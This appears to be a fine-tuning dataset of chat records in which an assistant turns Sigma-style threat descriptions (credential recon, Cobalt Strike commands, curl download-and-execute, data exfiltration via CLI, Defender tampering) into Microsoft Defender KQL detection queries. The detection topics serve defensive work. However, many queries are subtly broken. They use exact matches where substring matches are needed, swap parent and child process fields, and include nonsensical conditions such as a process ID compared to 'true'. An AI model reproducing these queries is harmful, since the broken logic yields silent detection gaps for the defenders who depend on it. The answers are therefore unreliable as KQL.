{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of cmdkey to look for cached credentials on the system Topic: proc_creation_win_cmdkey_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\cmdkey.exe\" or ProcessVersionInfoOriginalFileName =~ \"cmdkey.exe\") and (ProcessCommandLine contains \" -l\" or ProcessCommandLine contains \" /l\" or ProcessCommandLine contains \" \u2013l\" or ProcessCommandLine contains \" \u2014l\" or ProcessCommandLine contains \" \u2015l\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Cobalt Strike module/commands accidentally entered in CMD shell Topic: proc_creation_win_hktl_cobaltstrike_bloopers_modules"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Invoke-UserHunter\", \"Invoke-ShareFinder\", \"Invoke-Kerberoast\", \"Invoke-SMBAutoBrute\", \"Invoke-Nightmare\", \"zerologon\", \"av_query\")) and (ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\" or FolderPath endswith \"\\\\cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious child process of Script Event Consumer (scrcons.exe). Topic: proc_creation_win_scrcons_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\scrcons.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\svchost.exe\", \"\\\\dllhost.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\", \"\\\\cscript.exe\", \"\\\\schtasks.exe\", \"\\\\regsvr32.exe\", \"\\\\mshta.exe\", \"\\\\rundll32.exe\", \"\\\\msiexec.exe\", \"\\\\msbuild.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"ServiceDLL\" value related to a service in the registry.\nThis is often used as a method of persistence.\n Topic: registry_set_servicedll_hijack"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\System*\" and RegistryKey contains \"ControlSet\" and RegistryKey endswith \"\\\\Services*\") and RegistryKey endswith \"\\\\Parameters\\\\ServiceDll\") and (not(((RegistryValueData =~ \"%%systemroot%%\\\\system32\\\\ntdsa.dll\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\lsass.exe\" and RegistryKey endswith \"\\\\Services\\\\NTDS\\\\Parameters\\\\ServiceDll\") or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\poqexec.exe\" or RegistryValueData =~ \"C:\\\\Windows\\\\system32\\\\spool\\\\drivers\\\\x64\\\\3\\\\PrintConfig.dll\"))) and (not((RegistryValueData =~ \"C:\\\\Windows\\\\System32\\\\STAgent.dll\" and InitiatingProcessFolderPath =~ \"\\\\regsvr32.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary might use WMI to check if a certain remote service is running on a remote device.\nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\n Topic: proc_creation_win_wmic_recon_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"service\" and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers Topic: proc_creation_win_driverquery_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"driverquery.exe\" or ProcessVersionInfoOriginalFileName =~ \"drvqry.exe\") and (not(((InitiatingProcessFolderPath endswith \"\\\\cscript.exe\" or InitiatingProcessFolderPath endswith \"\\\\mshta.exe\" or InitiatingProcessFolderPath endswith \"\\\\regsvr32.exe\" or InitiatingProcessFolderPath endswith \"\\\\rundll32.exe\" or InitiatingProcessFolderPath endswith \"\\\\wscript.exe\") or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\\" or InitiatingProcessFolderPath contains \"\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\Temp\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_iis_access_logs"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".log\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of COM objects that can be abused to download files in PowerShell by CLSID Topic: proc_creation_win_powershell_download_com_cradles"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"[Type]::GetTypeFromCLSID(\" and (ProcessCommandLine in~ (\"0002DF01-0000-0000-C000-000000000046\", \"F6D90F16-9C73-11D3-B32E-00C04F990BB4\", \"F5078F35-C551-11D3-89B9-0000F81FE221\", \"88d96a0a-f192-11d4-a65f-0040963251e5\", \"AFBA6B42-5692-48EA-8141-DC517DCF0EF1\", \"AFB40FFD-B609-40A3-9828-F88BBE11E4E3\", \"88d96a0b-f192-11d4-a65f-0040963251e5\", \"2087c2f4-2cef-4953-a8ab-66779b670495\", \"000209FF-0000-0000-C000-000000000046\", \"00024500-0000-0000-C000-000000000046\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential CSharp Streamer RAT loading .NET executable image by using the default file name and path associated with the tool.\n Topic: image_load_malware_csharp_streamer_dotnet_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath matches regex \"\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\dat[0-9A-Z]{4}\\\\.tmp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"Net.EXE\". Topic: proc_creation_win_net_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" accounts\", \" group\", \" localgroup\", \" share\", \" start\", \" stop \", \" user\", \" view\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a ping command that uses a hex encoded IP address Topic: proc_creation_win_ping_hex_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"0x\" and InitiatingProcessFolderPath =~ \"\\\\ping.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"findstr\" with the argument \"385201\". Which could indicate potential discovery of an installed Sysinternals Sysmon service using the default driver altitude (even if the name is changed). Topic: proc_creation_win_findstr_sysmon_discovery_via_default_altitude"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" 385201\" and ((FolderPath endswith \"\\\\find.exe\" or FolderPath endswith \"\\\\findstr.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"FIND.EXE\", \"FINDSTR.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of an executable by another executable. Topic: file_event_win_susp_binary_dropper"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName =~ \".exe\" and InitiatingProcessFolderPath =~ \".exe\") and (not(((InitiatingProcessFolderPath contains \":\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Windows Defender\\\\\") or (FileName =~ \":\\\\Windows\\\\assembly\" and InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\" and InitiatingProcessFolderPath =~ \"\\\\mscorsvw.exe\") or (InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\System32\\\\msiexec.exe\", \":\\\\Windows\\\\system32\\\\cleanmgr.exe\", \":\\\\Windows\\\\explorer.exe\", \":\\\\WINDOWS\\\\system32\\\\dxgiadaptercache.exe\", \":\\\\WINDOWS\\\\system32\\\\Dism.exe\", \":\\\\Windows\\\\System32\\\\wuauclt.exe\")) or (FileName =~ \"\\\\AppData\\\\Local\\\\SquirrelTemp\\\\\" and InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\GitHubDesktop\\\\Update.exe\") or (FileName =~ \":\\\\Windows\\\\assembly\\\\NativeImages_\" and InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" and InitiatingProcessFolderPath =~ \"\\\\mscorsvw.exe\") or ((InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\\") or (FolderPath contains \":\\\\Program Files\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\\")) or ((FileName in~ (\"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\stage\\\\Teams.exe\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\stage\\\\Squirrel.exe\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\SquirrelTemp\\\\tempb\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\Update.exe\") or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\") or (InitiatingProcessFolderPath has_all (\"\\\\TiWorker.exe\") and InitiatingProcessFolderPath contains \":\\\\Windows\\\\WinSxS\\\\\") or (FileName =~ \":\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\\" and InitiatingProcessFolderPath =~ \":\\\\WINDOWS\\\\system32\\\\svchost.exe\") or ((FileName in~ (\":\\\\WUDownloadCache\\\\\", \"\\\\WindowsUpdateBox.exe\")) and InitiatingProcessFolderPath =~ \":\\\\Windows\\\\system32\\\\svchost.exe\") or (FileName =~ \"\\\\.vscode\\\\extensions\\\\\" and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\\" and InitiatingProcessFolderPath =~ \"\\\\Microsoft VS Code\\\\Code.exe\") or FileName =~ \"\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\\" or (InitiatingProcessFolderPath contains \":\\\\WINDOWS\\\\TEMP\\\\\" or FolderPath contains \":\\\\WINDOWS\\\\TEMP\\\\\") or (FileName =~ \":\\\\$WINDOWS.~BT\\\\Sources\\\\\" and InitiatingProcessFolderPath contains \":\\\\WINDOWS\\\\SoftwareDistribution\\\\Download\\\\\" and InitiatingProcessFolderPath =~ \"\\\\WindowsUpdateBox.Exe\")))) and (not(((FileName =~ \"\\\\Google\" and InitiatingProcessFolderPath =~ \"\\\\ChromeSetup.exe\") or ((FileName in~ (\"\\\\Python27\\\\Lib\\\\site-packages\\\\\", \"\\\\Python27\\\\Scripts\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\")) and InitiatingProcessFolderPath contains \"\\\\Python27\\\\python.exe\") or (FileName =~ \"\\\\AppData\\\\Local\" and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\SquirrelTemp\\\\Update.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Radmin which can be abused by an adversary to remotely control Windows machines Topic: proc_creation_win_pua_radmin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"Radmin Viewer\" or ProcessVersionInfoProductName =~ \"Radmin Viewer\" or ProcessVersionInfoOriginalFileName =~ \"Radmin.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation attempt of Cleos CVE-2024-50623 by looking for a \"cmd.exe\" process spawning from the Celo software suite with suspicious Powershell commandline.\n Topic: proc_creation_win_exploit_cve_2024_50623_cleo"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\"Harmony\", \"lexicom\", \"VersaLex\", \"VLTrader\")) and InitiatingProcessFileName =~ \"\\\\javaw.exe\" and (ProcessCommandLine in~ (\"powershell\", \" -enc \", \" -EncodedCommand\", \".Download\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a ISO file in the Outlook temp folder or in the Appdata temp folder. Typical of Qakbot TTP from end-July 2022. Topic: file_event_win_iso_file_mount"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".iso\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later. Topic: proc_creation_win_cmd_curl_download_exec_combo"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -c \" or ProcessCommandLine contains \" /c \" or ProcessCommandLine contains \" \u2013c \" or ProcessCommandLine contains \" \u2014c \" or ProcessCommandLine contains \" \u2015c \") and (ProcessCommandLine in~ (\"curl \", \"http\", \"-o\", \"&\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation) Topic: proc_creation_win_java_keytool_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\keytool.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\sh.exe\", \"\\\\bash.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\schtasks.exe\", \"\\\\certutil.exe\", \"\\\\whoami.exe\", \"\\\\bitsadmin.exe\", \"\\\\wscript.exe\", \"\\\\cscript.exe\", \"\\\\scrcons.exe\", \"\\\\regsvr32.exe\", \"\\\\hh.exe\", \"\\\\wmic.exe\", \"\\\\mshta.exe\", \"\\\\rundll32.exe\", \"\\\\forfiles.exe\", \"\\\\scriptrunner.exe\", \"\\\\mftrace.exe\", \"\\\\AppVLP.exe\", \"\\\\systeminfo.exe\", \"\\\\reg.exe\", \"\\\\query.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the commonly used ZeroLogon PoC executable. Topic: proc_creation_win_exploit_cve_2020_1472_zero_poc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\cmd.exe\" and (ProcessCommandLine in~ (\"Administrator\", \"-c\")) and (InitiatingProcessFolderPath in~ (\"\\\\cool.exe\", \"\\\\zero.exe\"))) and ((ProcessCommandLine in~ (\"taskkill\", \"/f\", \"/im\")) or ProcessCommandLine =~ \"powershell\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV Topic: proc_creation_win_powershell_base64_mppreference"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"QWRkLU1wUHJlZmVyZW5jZS\" or ProcessCommandLine contains \"FkZC1NcFByZWZlcmVuY2Ug\" or ProcessCommandLine contains \"BZGQtTXBQcmVmZXJlbmNlI\" or ProcessCommandLine contains \"U2V0LU1wUHJlZmVyZW5jZS\" or ProcessCommandLine contains \"NldC1NcFByZWZlcmVuY2Ug\" or ProcessCommandLine contains \"TZXQtTXBQcmVmZXJlbmNlI\" or ProcessCommandLine contains \"YWRkLW1wcHJlZmVyZW5jZS\" or ProcessCommandLine contains \"FkZC1tcHByZWZlcmVuY2Ug\" or ProcessCommandLine contains \"hZGQtbXBwcmVmZXJlbmNlI\" or ProcessCommandLine contains \"c2V0LW1wcHJlZmVyZW5jZS\" or ProcessCommandLine contains \"NldC1tcHByZWZlcmVuY2Ug\" or ProcessCommandLine contains \"zZXQtbXBwcmVmZXJlbmNlI\") or (ProcessCommandLine contains \"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or ProcessCommandLine contains \"EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or ProcessCommandLine contains \"BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or ProcessCommandLine contains \"UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or ProcessCommandLine contains \"MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or ProcessCommandLine contains \"TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or ProcessCommandLine contains \"YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or ProcessCommandLine contains \"EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or ProcessCommandLine contains \"hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or ProcessCommandLine contains \"cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or ProcessCommandLine contains \"MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or ProcessCommandLine contains \"zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line Topic: proc_creation_win_susp_obfuscated_ip_via_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\ping.exe\", \"\\\\arp.exe\")) and ((ProcessCommandLine in~ (\" 0x\", \"//0x\", \".0x\", \".00x\")) or (ProcessCommandLine in~ (\"http://%\", \"%2e\")) or (ProcessCommandLine matches regex \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or ProcessCommandLine matches regex \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or ProcessCommandLine matches regex \"https?://0[0-9]{3,11}\" or ProcessCommandLine matches regex \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or ProcessCommandLine matches regex \"https?://0[0-9]{1,11}\" or ProcessCommandLine matches regex \" [0-7]{7,13}\")) and (not(ProcessCommandLine matches regex \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading using comctl32.dll to obtain system privileges Topic: image_load_side_load_comctl32"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath startswith \"C:\\\\Windows\\\\System32\\\\logonUI.exe.local\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\werFault.exe.local\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\consent.exe.local\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\narrator.exe.local\\\\\" or FolderPath startswith \"C:\\\\windows\\\\system32\\\\wermgr.exe.local\\\\\") and FolderPath endswith \"\\\\comctl32.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an admin share is mounted using net.exe Topic: proc_creation_win_net_use_mount_admin_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" use \") or (ProcessCommandLine contains \" \\\\\" and ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \"$\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function. Topic: registry_event_hybridconnectionmgr_svc_installation"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Services\\\\HybridConnectionManager\" or (ActionType =~ \"RegistryValueSet\" and RegistryValueData contains \"Microsoft.HybridConnectionManager.Listener.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable that isnt dropbox but communicates with the Dropbox API Topic: net_connection_win_domain_dropbox_api"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\"api.dropboxapi.com\", \"content.dropboxapi.com\"))) and (not(InitiatingProcessFolderPath contains \"\\\\Dropbox\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n Topic: proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\"))) and (InitiatingProcessCommandLine =~ \"confluence\" and (InitiatingProcessFileName in~ (\"\\\\tomcat8.exe\", \"\\\\tomcat9.exe\", \"\\\\tomcat10.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_teamviewer_logs"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".log\" and (not(InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389 Topic: net_connection_win_rdp_reverse_tunnel"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"::1/128\")) and (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\" and LocalPort == 3389)"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to create and/or add an account to the admin group, thus granting admin privileges. Topic: proc_creation_macos_dseditgroup_add_to_admin_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -o edit \", \" -a \", \" -t user\", \"admin\")) and InitiatingProcessFolderPath =~ \"/dseditgroup\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a tscon.exe start as LOCAL SYSTEM Topic: proc_creation_win_tscon_localsystem"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessFolderPath =~ \"\\\\tscon.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the import of a alternate datastream to the registry with regedit.exe. Topic: proc_creation_win_regedit_import_keys_ads"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine matches regex \":[^ \\\\\\\\]\" and (ProcessCommandLine in~ (\" /i \", \".reg\"))) and (FolderPath endswith \"\\\\regedit.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGEDIT.EXE\")) and (not((ProcessCommandLine contains \" -e \" or ProcessCommandLine contains \" /e \" or ProcessCommandLine contains \" \u2013e \" or ProcessCommandLine contains \" \u2014e \" or ProcessCommandLine contains \" \u2015e \" or ProcessCommandLine contains \" -a \" or ProcessCommandLine contains \" /a \" or ProcessCommandLine contains \" \u2013a \" or ProcessCommandLine contains \" \u2014a \" or ProcessCommandLine contains \" \u2015a \" or ProcessCommandLine contains \" -c \" or ProcessCommandLine contains \" /c \" or ProcessCommandLine contains \" \u2013c \" or ProcessCommandLine contains \" \u2014c \" or ProcessCommandLine contains \" \u2015c \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of various CLI utilities exfiltrating data via web requests Topic: proc_creation_win_susp_data_exfiltration_via_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\" -ur\", \" -me\", \" -b\", \" POST \")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\cmd.exe\"))) or ((ProcessCommandLine =~ \"--ur\" and InitiatingProcessFolderPath =~ \"\\\\curl.exe\") and (ProcessCommandLine in~ (\" -d \", \" --data \"))) or ((ProcessCommandLine in~ (\"--post-data\", \"--post-file\")) and InitiatingProcessFolderPath =~ \"\\\\wget.exe\")) and ((ProcessCommandLine contains \"Get-Content\" or ProcessCommandLine contains \"GetBytes\" or ProcessCommandLine contains \"hostname\" or ProcessCommandLine contains \"ifconfig\" or ProcessCommandLine contains \"ipconfig\" or ProcessCommandLine contains \"net view\" or ProcessCommandLine contains \"netstat\" or ProcessCommandLine contains \"nltest\" or ProcessCommandLine contains \"qprocess\" or ProcessCommandLine contains \"sc query\" or ProcessCommandLine contains \"systeminfo\" or ProcessCommandLine contains \"tasklist\" or ProcessCommandLine contains \"ToBase64String\" or ProcessCommandLine contains \"whoami\") or (ProcessCommandLine contains \"type \" and ProcessCommandLine contains \" > \" and ProcessCommandLine contains \" C:\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesnt contain a \".dll\" extension. This is often used as a defense evasion method. Topic: proc_creation_win_odbcconf_driver_install_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"INSTALLDRIVER \" and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")) and (not(ProcessCommandLine =~ \".dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect set EnableFirewall to 0 to disable the Windows firewall Topic: registry_set_disable_windows_firewall"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\EnableFirewall\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\EnableFirewall\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
